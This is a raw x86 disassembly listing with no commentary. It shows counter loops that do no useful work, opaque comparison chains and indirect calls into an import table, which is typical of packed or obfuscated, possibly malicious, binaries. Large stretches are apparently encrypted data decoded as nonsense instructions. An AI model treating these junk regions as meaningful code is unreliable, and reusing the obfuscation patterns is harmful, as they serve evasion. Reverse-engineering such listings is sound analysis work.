  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4335fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a5a
  403acb:	and    BYTE PTR [edi+0x7e1020ab],dh
  403ad1:	jle    0x403b2b
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b3a
  403ad7:	xor    cl,0xc1
  403ada:	sbb    ebp,DWORD PTR [ebx+0x47]
  403add:	loopne 0x403af7
  403adf:	fld    QWORD PTR [edx+0x32]
  403ae2:	jecxz  0x403b22
  403ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ae5:	mov    dh,0x9a
  403ae7:	dec    edi
  403ae8:	aad    0xe
  403aea:	stos   DWORD PTR es:[edi],eax
  403aeb:	xor    cl,0x13
  403aee:	jmp    0x403adf
  403af0:	shl    BYTE PTR [esi],1
  403af2:	jae    0x403a96
  403af4:	pusha  
  403af5:	sub    edx,DWORD PTR [edx-0xf249fb0]
  403afb:	mov    WORD PTR [ebx-0x51],ss
  403afe:	fisttp WORD PTR [ebx-0x74]
  403b01:	mov    eax,fs:0x9f6f46ac
  403b07:	push   es
  403b08:	stc    
  403b09:	adc    DWORD PTR [edi-0x20],ecx
  403b0c:	loopne 0x403b09
  403b0e:	arpl   WORD PTR [eax-0x15],di
  403b11:	add    BYTE PTR [esi-0x7e853e09],al
  403b17:	push   ecx
  403b18:	push   ecx
  403b19:	and    eax,edi
  403b1b:	in     eax,0xa1
  403b1d:	imul   BYTE PTR [edi-0x29e1264]
  403b23:	and    cl,ah
  403b25:	test   eax,0xcbf8e87b
  403b2a:	mov    ebp,0x4dd8122f
  403b2f:	(bad)  
  403b30:	ja     0x403b55
  403b32:	aam    0xd1
  403b34:	jmp    DWORD PTR [ecx]
  403b36:	pop    ebp
  403b37:	push   ebp
  403b38:	(bad)  
  403b39:	sar    BYTE PTR ds:0x90a9ddeb,1
  403b3f:	fs and al,0xe1
  403b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b43:	daa    
  403b44:	mov    DWORD PTR [esi+edi*4-0x103ac8ca],edi
  403b4b:	sbb    esp,DWORD PTR es:[esi+ebp*8]
  403b4f:	int    0xec
  403b51:	repz out 0x94,eax
  403b54:	dec    esi
  403b55:	cmp    esp,0x58a041a8
  403b5b:	adc    al,0x4a
  403b5d:	out    0x92,al
  403b5f:	and    eax,0x222a2ce
  403b64:	inc    esp
  403b65:	gs stos DWORD PTR es:[edi],eax
  403b67:	or     al,0x4c
  403b69:	std    
  403b6a:	dec    esi
  403b6b:	je     0x403b77
  403b6d:	push   edx
  403b6e:	sahf   
  403b6f:	lock pop eax
  403b71:	lods   al,BYTE PTR ds:[esi]
  403b72:	mov    BYTE PTR ds:0x6efb1b10,bh
  403b78:	int3   
  403b79:	rcl    bh,1
  403b7b:	sbb    al,0xa0
  403b7d:	rcr    DWORD PTR [ebp-0x58],0x7c
  403b81:	push   ebx
  403b82:	or     bh,BYTE PTR [ebp-0x68]
  403b85:	das    
  403b86:	push   esp
  403b87:	sbb    al,BYTE PTR [edi]
  403b89:	fiadd  WORD PTR [edi-0x1a]
  403b8c:	dec    ecx
  403b8d:	add    al,0x78
  403b8f:	aad    0x54
  403b91:	sbb    bl,ch
  403b93:	dec    edi
  403b94:	push   es
  403b95:	scas   ax,WORD PTR es:[edi]
  403b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b98:	js     0x403bd9
  403b9a:	xchg   ebp,eax
  403b9b:	pop    edx
  403b9c:	jp     0x403bdf
  403b9e:	jmp    0x403b31
  403ba0:	push   ebp
  403ba1:	pop    edx
  403ba2:	add    DWORD PTR [edx-0x1e80d5e6],0x7b
  403ba9:	pop    es
  403baa:	mov    al,ds:0x9cf2d60a
  403baf:	push   ebp
  403bb0:	pop    ss
  403bb1:	sub    eax,0x42820e33
  403bb6:	in     al,dx
  403bb7:	out    0x40,al
  403bb9:	cwde   
  403bba:	xor    ecx,DWORD PTR [ecx-0x50]
  403bbd:	add    BYTE PTR [edx+edx*4],bh
  403bc0:	and    al,0xb3
  403bc2:	push   edx
  403bc3:	sbb    eax,ebx
  403bc5:	push   edi
  403bc6:	mov    esp,0xfe4b536f
  403bcb:	lock loopne 0x403c27
  403bce:	js     0x403c31
  403bd0:	test   dl,dh
  403bd2:	dec    ebp
  403bd3:	int    0xe4
  403bd5:	add    bl,BYTE PTR [edi+eax*1]
  403bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd9:	or     DWORD PTR [edx+0x2771d51c],esp
  403bdf:	adc    al,0xc4
  403be1:	pop    ecx
  403be2:	cmc    
  403be3:	int    0x2e
  403be5:	jne    0x403b78
  403be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403be8:	std    
  403be9:	int3   
  403bea:	and    eax,0x76318827
  403bef:	fistp  DWORD PTR [edi]
  403bf1:	mov    DWORD PTR [esi+0x6],edx
  403bf4:	jge    0x403c59
  403bf6:	add    ebx,DWORD PTR [ebx+ebp*1]
  403bf9:	pop    eax
  403bfa:	fcomp  QWORD PTR [eax-0x5f]
  403bfd:	imul   ecx,DWORD PTR [esi],0x46
  403c00:	sub    bh,BYTE PTR [ebx]
  403c02:	loop   0x403c53
  403c04:	xchg   ebx,eax
  403c05:	mov    DWORD PTR [ebp+0x22842a74],ecx
  403c0b:	imul   esi,ecx,0x60
  403c0e:	aam    0x67
  403c10:	js     0x403b99
  403c12:	fadd   QWORD PTR [edi-0x61]
  403c15:	pop    ds
  403c16:	add    DWORD PTR [ebx],ecx
  403c18:	push   0x19
  403c1a:	inc    ebp
  403c1b:	nop
  403c1c:	pop    edi
  403c1d:	jo     0x403c76
  403c1f:	je     0x403c5f
  403c21:	ret    0xfe8
  403c24:	mov    ecx,DWORD PTR [eax+edx*4+0x1c]
  403c28:	stc    
  403c29:	xchg   BYTE PTR [eax],bh
  403c2b:	jo     0x403bd0
  403c2d:	jns    0x403c19
  403c2f:	mov    ds:0xf2f78d13,al
  403c34:	(bad)  
  403c35:	jbe    0x403bd8
  403c37:	cwde   
  403c38:	xchg   edx,eax
  403c39:	add    BYTE PTR [edx-0x6c],0x56
  403c3d:	out    dx,al
  403c3e:	shl    DWORD PTR [ecx-0x3e6ce36a],0xa5
  403c45:	leave  
  403c46:	jo     0x403bf9
  403c48:	inc    ecx
  403c49:	enter  0xe17,0xab
  403c4d:	xlat   BYTE PTR ds:[ebx]
  403c4e:	sahf   
  403c4f:	pop    ds
  403c50:	sbb    esp,DWORD PTR [edx+0x76]
  403c53:	stos   DWORD PTR es:[edi],eax
  403c54:	and    eax,0x2efb2f6b
  403c59:	test   edx,esi
  403c5b:	xchg   ebx,eax
  403c5c:	in     al,dx
  403c5d:	rcl    esp,cl
  403c5f:	and    DWORD PTR [ebx+ebp*4+0x46],ecx
  403c63:	pusha  
  403c64:	lods   eax,DWORD PTR ds:[esi]
  403c65:	xchg   ecx,eax
  403c66:	sti    
  403c67:	push   0xc46cd58f
  403c6c:	add    al,0x98
  403c6e:	adc    eax,0x1bef8866
  403c73:	ror    dl,1
  403c75:	aad    0x7a
  403c77:	into   
  403c78:	pop    ebx
  403c79:	stos   BYTE PTR es:[edi],al
  403c7a:	add    BYTE PTR [edx],ah
  403c7c:	sub    al,0xf8
  403c7e:	xchg   ebp,eax
  403c7f:	mov    cl,0xfb
  403c81:	xchg   esp,eax
  403c82:	or     DWORD PTR [edi-0x1b29cc2b],edx
  403c88:	mov    ds:0x68d190eb,al
  403c8d:	(bad)  
  403c8e:	fld    st(7)
  403c90:	shr    BYTE PTR [ecx-0x2f9ff3c4],0xa5
  403c97:	pop    ecx
  403c98:	push   edi
  403c99:	mov    BYTE PTR [edi+0x78],cl
  403c9c:	push   ebx
  403c9d:	shld   DWORD PTR [eax+0x522a0e95],ebp,cl
  403ca4:	mov    dh,ah
  403ca6:	(bad)  
  403ca7:	cmp    al,BYTE PTR [ecx-0x14]
  403caa:	and    esp,edx
  403cac:	scas   al,BYTE PTR es:[edi]
  403cad:	mov    ds:0x3d3a869e,al
  403cb2:	adc    al,0x93
  403cb4:	je     0x403cc5
  403cb6:	les    edi,FWORD PTR [eax-0x5183943c]
  403cbc:	mov    ecx,DWORD PTR [esi+0x1]
  403cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc0:	aad    0x7e
  403cc2:	pop    es
  403cc3:	pop    esp
  403cc4:	mov    ds:0xa14bd3de,al
  403cc9:	dec    esi
  403cca:	pop    ss
  403ccb:	outs   dx,DWORD PTR ds:[esi]
  403ccc:	out    0xb0,al
  403cce:	repnz xor DWORD PTR [ecx-0x430611ac],edx
  403cd5:	int    0x7b
  403cd7:	mov    fs,WORD PTR [eax]
  403cd9:	pop    esi
  403cda:	mov    al,0x73
  403cdc:	aam    0xbe
  403cde:	or     edi,edi
  403ce0:	out    0x6e,al
  403ce2:	mov    ecx,0xc8858427
  403ce7:	in     eax,dx
  403ce8:	push   0x68410c49
  403ced:	or     eax,0xa6572527
  403cf2:	ror    BYTE PTR [eax+0xa],cl
  403cf5:	pusha  
  403cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf7:	in     al,dx
  403cf8:	mov    ebp,0x732f22a5
  403cfd:	call   0xafbb7a14
  403d02:	dec    eax
  403d03:	aaa    
  403d04:	inc    ebp
  403d05:	cdq    
  403d06:	mov    esi,0x528e2171
  403d0b:	jb     0x403d29
  403d0d:	fxrstor [esi+esi*1-0xcaf9744]
  403d15:	jnp    0x403cc8
  403d17:	test   dl,al
  403d19:	or     BYTE PTR [edx+0x2a97459e],ch
  403d1f:	or     ch,BYTE PTR [bx]
  403d22:	pop    es
  403d23:	mov    edx,0x37d8dc7c
  403d28:	sbb    ebp,0x92de8016
  403d2e:	nop
  403d2f:	scas   al,BYTE PTR es:[edi]
  403d30:	mov    BYTE PTR [edx+ebp*8-0x44],bh
  403d34:	xchg   ebx,eax
  403d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d36:	pop    eax
  403d37:	jl     0x403d56
  403d39:	(bad)  
  403d3a:	and    al,0xca
  403d3c:	sub    eax,0xeb3c50d5
  403d41:	dec    edi
  403d42:	push   0x591add62
  403d47:	test   DWORD PTR [esi+0x4a8cb482],ecx
  403d4d:	fnstenv [esi+edx*8+0x7befb9b7]
  403d54:	mov    bl,0xeb
  403d56:	sbb    cl,al
  403d58:	add    eax,0x76064fad
  403d5d:	and    edx,edx
  403d5f:	xor    dh,bl
  403d61:	add    al,0xf3
  403d63:	push   eax
  403d64:	xor    al,BYTE PTR [ebp+0x10fc1d97]
  403d6a:	sub    edx,DWORD PTR [edx+ebp*2-0x77]
  403d6e:	jo     0x403d9a
  403d70:	adc    DWORD PTR [ebp+0x155c3c29],esi
  403d76:	(bad)  
  403d77:	xchg   esi,eax
  403d78:	add    al,0x5
  403d7a:	add    BYTE PTR [edi+ecx*1],dh
  403d7d:	and    cl,BYTE PTR [ebx-0x48]
  403d80:	jmp    0x403d03
  403d82:	and    BYTE PTR [esi-0x18319d4f],0x88
  403d89:	data16 cmp ah,cl
  403d8c:	jne    0x403d66
  403d8e:	and    bh,BYTE PTR [ebx+0x3d]
  403d91:	add    dh,BYTE PTR [ebp+0x59]
  403d94:	and    edi,ebp
  403d96:	push   ss
  403d97:	lahf   
  403d98:	rcl    DWORD PTR [esi*2-0x50a5bc2a],cl
  403d9f:	les    ecx,FWORD PTR [ecx-0x5b]
  403da2:	enter  0x817,0xaa
  403da6:	jmp    0x188a:0xd370ac6c
  403dad:	mov    eax,0xaccb90e7
  403db2:	mov    bl,0xc0
  403db4:	(bad)  
  403db5:	cmc    
  403db6:	mov    DWORD PTR [esi-0x1d14f30e],esp
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffa8
  403e75:	ror    dh,cl
  403e77:	inc    ebx
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e71
  403e81:	jl     0x403ea2
  403e83:	xor    edi,edi
  403e85:	aas    
  403e86:	fsubr  QWORD PTR [edi+0x2]
  403e89:	inc    ecx
  403e8a:	inc    edx
  403e8b:	push   ecx
  403e8c:	jnp    0x403eeb
  403e8e:	fs retf 
  403e90:	ror    DWORD PTR [ebp+0x524c3e58],cl
  403e96:	mov    bl,0x9b
  403e98:	jo     0x403eb8
  403e9a:	inc    esi
  403e9b:	das    
  403e9c:	clc    
  403e9d:	cmp    dh,al
  403e9f:	and    eax,edi
  403ea1:	out    0x82,eax
  403ea3:	cs aaa 
  403ea5:	fiadd  WORD PTR [ebp-0x3a6cd49b]
  403eab:	ror    DWORD PTR [eax],0x99
  403eae:	icebp  
  403eaf:	and    al,0x80
  403eb1:	jge    0x403ee6
  403eb3:	test   BYTE PTR [eax-0x9],bh
  403eb6:	adc    al,0x8
  403eb8:	es xor eax,0x3df61a0e
  403ebe:	mov    edx,0x38cdb7be
  403ec3:	addr16 arpl ax,bx
  403ec6:	mov    DWORD PTR [ecx+0x4c48736c],0xc755f77a
  403ed0:	jb     0x403e81
  403ed2:	mov    ebx,0x46d53cde
  403ed7:	add    al,0xf2
  403ed9:	push   0x4475bb03
  403ede:	xchg   edx,eax
  403edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ee0:	sbb    al,BYTE PTR [eax]
  403ee2:	jle    0x403f20
  403ee4:	xchg   ebp,eax
  403ee5:	mov    ebx,DWORD PTR [edi-0x6eb6f8a4]
  403eeb:	jecxz  0x403f26
  403eed:	retf   
  403eee:	pop    esp
  403eef:	test   DWORD PTR [eax-0x499bebc6],esp
  403ef5:	popa   
  403ef6:	pop    es
  403ef7:	push   ecx
  403ef8:	adc    al,0xd2
  403efa:	retf   
  403efb:	in     eax,0x67
  403efd:	mov    BYTE PTR [ebx],bh
  403eff:	xchg   edx,eax
  403f00:	inc    ecx
  403f01:	in     al,0x41
  403f03:	mov    ds:0x6935fd80,eax
  403f08:	xor    edi,DWORD PTR [edi-0x31bfef46]
  403f0e:	fldenv [edi+0x6cd80b03]
  403f14:	jne    0x403f07
  403f16:	lods   eax,DWORD PTR ds:[esi]
  403f17:	int3   
  403f18:	add    BYTE PTR [edx],bl
  403f1a:	and    ah,BYTE PTR [edi]
  403f1c:	test   bh,0x78
  403f1f:	mov    cl,cl
  403f21:	adc    eax,0xd2b81856
  403f26:	xor    al,0xa7
  403f28:	jp     0x403ead
  403f2a:	aad    0x14
  403f2c:	clc    
  403f2d:	adc    esi,ecx
  403f2f:	xchg   esp,eax
  403f30:	adc    eax,DWORD PTR [edx+0xf]
  403f33:	adc    eax,0x466a35a4
  403f38:	xchg   edi,eax
  403f39:	fwait
  403f3a:	outs   dx,DWORD PTR ds:[esi]
  403f3b:	sub    eax,edi
  403f3d:	inc    esi
  403f3e:	daa    
  403f3f:	jecxz  0x403f8e
  403f41:	and    eax,0xcca15a18
  403f46:	jmp    DWORD PTR [eax]
  403f48:	jns    0x403fa9
  403f4a:	test   eax,0x990dbf0c
  403f4f:	ret    
  403f50:	mov    bl,0x74
  403f52:	sub    BYTE PTR [ecx+0xe34befb],cl
  403f58:	fbstp  TBYTE PTR [ecx-0x59a3e978]
  403f5e:	(bad)  [ecx-0xf0d6c0f]
  403f64:	and    esp,DWORD PTR [eax]
  403f66:	xchg   edi,eax
  403f67:	mov    dh,0x7f
  403f69:	out    0xdb,eax
  403f6b:	add    DWORD PTR [edx-0x4d],ebp
  403f6e:	dec    esi
  403f6f:	jecxz  0x403fec
  403f71:	pop    ss
  403f72:	mov    dh,0x76
  403f74:	pushf  
  403f75:	cmp    DWORD PTR ds:0xa727104c,esi
  403f7b:	sar    DWORD PTR [esp+ebx*2],cl
  403f7e:	jl     0x403fb8
  403f80:	test   al,0x5a
  403f82:	stos   BYTE PTR es:[edi],al
  403f83:	adc    eax,esi
  403f85:	jmp    0x2a75:0x5c04bb34
  403f8c:	sti    
  403f8d:	imul   eax,DWORD PTR ds:0xec7f7aec,0x2a86f831
  403f97:	adc    BYTE PTR [ebx],al
  403f99:	jp     0x403ff2
  403f9b:	dec    esp
  403f9c:	jne    0x403fb2
  403f9e:	and    eax,0x418e30a6
  403fa3:	push   eax
  403fa4:	add    eax,0xf438d1b6
  403fa9:	sahf   
  403faa:	adc    cl,dl
  403fac:	mov    eax,ds:0xc9f78c4a
  403fb1:	add    eax,0xa00f8b16
  403fb6:	mov    ds:0x35b3be65,eax
  403fbb:	add    al,0xf0
  403fbd:	ficomp WORD PTR [edx]
  403fbf:	je     0x403fe6
  403fc1:	jbe    0x404001
  403fc3:	adc    ecx,eax
  403fc5:	fwait
  403fc6:	cwde   
  403fc7:	pop    ebp
  403fc8:	adc    ah,dh
  403fca:	daa    
  403fcb:	and    BYTE PTR [esi],ch
  403fcd:	sub    DWORD PTR [ebx-0x5f37a6a5],0xffffffb5
  403fd4:	jne    0x403fae
  403fd6:	push   esp
  403fd7:	add    eax,0x23790943
  403fdc:	cmp    ebx,0x207decda
  403fe2:	call   0xd6256ba0
  403fe7:	push   eax
  403fe8:	aaa    
  403fe9:	push   esi
  403fea:	or     bl,ah
  403fec:	xchg   dh,dl
  403fee:	gs pop esp
  403ff0:	out    0xc3,eax
  403ff2:	mov    cl,0x68
  403ff4:	and    esi,DWORD PTR [ecx]
  403ff6:	inc    esp
  403ff7:	(bad)  
  403ff8:	push   edx
  403ff9:	sbb    ebx,edi
  403ffb:	mov    esp,0x9664e5b0
  404000:	sub    ebp,DWORD PTR [edi-0x2d]
  404003:	shr    DWORD PTR [edx],cl
  404005:	leave  
  404006:	dec    esp
  404007:	jb     0x403fe6
  404009:	mov    BYTE PTR [eax+0x33392ee2],bh
  40400f:	enter  0xdd54,0xc1
  404013:	fcomp  DWORD PTR [eax+0x5712c43]
  404019:	hlt    
  40401a:	dec    esp
  40401b:	sbb    eax,0x85d2c52d
  404020:	dec    eax
  404021:	leave  
  404022:	fwait
  404023:	xchg   esp,eax
  404024:	xor    eax,0xe0207d38
  404029:	aad    0x25
  40402b:	pop    ss
  40402c:	mov    ds:0x666db1e4,al
  404031:	inc    esi
  404032:	mov    ds:0xa1164c07,eax
  404037:	cmp    DWORD PTR [ebx+0x2391fdf9],esi
  40403d:	lods   eax,DWORD PTR ds:[esi]
  40403e:	int    0x64
  404040:	inc    edx
  404041:	mov    esi,0x99419add
  404046:	dec    ebp
  404047:	jns    0x403fd7
  404049:	xchg   esi,eax
  40404a:	fild   WORD PTR [edx+ecx*1]
  40404d:	dec    edi
  40404e:	xchg   ebp,eax
  40404f:	(bad)  
  404050:	and    ebx,DWORD PTR [eax]
  404052:	loopne 0x4040b2
  404054:	bound  edx,QWORD PTR [eax]
  404056:	jmp    0x7ca627ae
  40405b:	sti    
  40405c:	stc    
  40405d:	or     eax,0x1052d712
  404062:	call   0xb6ca:0x240fe635
  404069:	in     al,dx
  40406a:	adc    eax,DWORD PTR [ebp+0x1969f8df]
  404070:	dec    ebp
  404071:	fisub  DWORD PTR [ecx]
  404073:	jmp    0x40405f
  404075:	loopne 0x404068
  404077:	mov    dl,dl
  404079:	sbb    al,0x75
  40407b:	pop    edi
  40407c:	enter  0x2a64,0xad
  404080:	adc    edx,ebp
  404082:	adc    eax,0x8401dfe
  404087:	repnz add DWORD PTR [ecx],ebp
  40408a:	inc    edi
  40408b:	sub    al,0xcb
  40408d:	jmp    0xae83:0x30eb9aa8
  404094:	adc    dh,BYTE PTR [ebx]
  404096:	or     DWORD PTR [ecx],edi
  404098:	mov    ebp,ecx
  40409a:	fld    QWORD PTR [esi]
  40409c:	mov    ecx,0xfcf689e4
  4040a1:	xchg   BYTE PTR [bp+di-0x5184],bh
  4040a6:	inc    esi
  4040a7:	addr16 jo 0x4040c7
  4040aa:	icebp  
  4040ab:	sbb    edi,DWORD PTR [ecx]
  4040ad:	test   DWORD PTR [edi-0x76],edi
  4040b0:	cmc    
  4040b1:	inc    ebx
  4040b2:	pop    ss
  4040b3:	adc    BYTE PTR [edi+0xc],bl
  4040b6:	ds mov al,0x13
  4040b9:	mov    DWORD PTR [esi+esi*1+0x469dca39],ebp
  4040c0:	std    
  4040c1:	cld    
  4040c2:	xchg   esi,eax
  4040c3:	or     edx,DWORD PTR [eax]
  4040c5:	sbb    edi,DWORD PTR [esi-0x2f]
  4040c8:	out    dx,eax
  4040c9:	add    al,ah
  4040cb:	inc    esp
  4040cc:	leave  
  4040cd:	jl     0x404072
  4040cf:	adc    cl,ch
  4040d1:	mov    bh,0x8f
  4040d3:	pop    ecx
  4040d4:	es mov edx,0x725da458
  4040da:	scas   al,BYTE PTR es:[edi]
  4040db:	sbb    eax,0x25745794
  4040e0:	cmp    al,0xb0
  4040e2:	dec    eax
  4040e3:	mov    bl,0xad
  4040e5:	or     eax,0x75c9ae65
  4040ea:	sbb    al,0x33
  4040ec:	shr    DWORD PTR [edx],0xf1
  4040ef:	fld    st(1)
  4040f1:	lock xchg edx,eax
  4040f3:	out    0x46,al
  4040f5:	lahf   
  4040f6:	xor    BYTE PTR [esi+0x3b],0xf
  4040fa:	int3   
  4040fb:	inc    ebp
  4040fc:	fmul   st(6),st
  4040fe:	mov    dl,0xef
  404100:	and    BYTE PTR [edi+0x49173924],al
  404106:	jno    0x4040f3
  404108:	cmp    edi,esp
  40410a:	rcl    BYTE PTR [ecx+edi*1-0x5eaf4de8],0x14
  404112:	cmc    
  404113:	push   0xffffffa0
  404115:	(bad)  [ebp-0x49919820]
  40411b:	pop    ss
  40411c:	mov    DWORD PTR [eax-0x53],ebx
  40411f:	cmp    dl,BYTE PTR [ebp+0x3c]
  404122:	pop    ebx
  404123:	sub    al,0x56
  404125:	daa    
  404126:	rcl    DWORD PTR [ebp-0x16b922df],cl
  40412c:	cmp    esp,DWORD PTR [eax-0x6e85b4ce]
  404132:	and    DWORD PTR [esi+edi*4+0x447e9174],eax
  404139:	mov    dh,0x4b
  40413b:	pusha  
  40413c:	add    DWORD PTR [esp+ebp*8-0x5c0faffb],0x4c19865
  404147:	out    0xa,al
  404149:	idiv   DWORD PTR [edi]
  40414b:	xor    eax,0x5162b486
  404150:	jbe    0x40411a
  404152:	or     al,0x13
  404154:	jno    0x404105
  404156:	push   esp
  404157:	ret    
  404158:	pop    edx
  404159:	sar    DWORD PTR [eax+0x79],cl
  40415c:	inc    edx
  40415d:	fisubr WORD PTR [edi+0x2b9dc75a]
  404163:	mov    eax,DWORD PTR [edi]
  404165:	leave  
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    al,dh
  40418b:	add    DWORD PTR [edi-0x4d],ebp
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041a4
  404197:	xor    al,BYTE PTR [esi+0x65613470]
  40419d:	push   0xffffffe1
  40419f:	sbb    eax,0xfda172ea
  4041a4:	or     ch,BYTE PTR [ebp+0xe]
  4041a7:	nop
  4041a8:	ret    0xad12
  4041ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ac:	mov    eax,0xf22610ef
  4041b1:	js     0x404197
  4041b3:	(bad)  
  4041b4:	call   0x317a:0x3ec2894a
  4041bb:	push   es
  4041bc:	arpl   WORD PTR [edi+0x59],si
  4041bf:	xchg   ebp,eax
  4041c0:	xchg   ebp,eax
  4041c1:	das    
  4041c2:	mov    ebp,0x5019b737
  4041c7:	jp     0x4041ce
  4041c9:	inc    ecx
  4041ca:	jmp    0xca89:0xae5acb74
  4041d1:	push   eax
  4041d2:	mov    bl,BYTE PTR [edx]
  4041d4:	(bad)  
  4041d5:	fiadd  DWORD PTR [eax]
  4041d7:	jne    0x4041ed
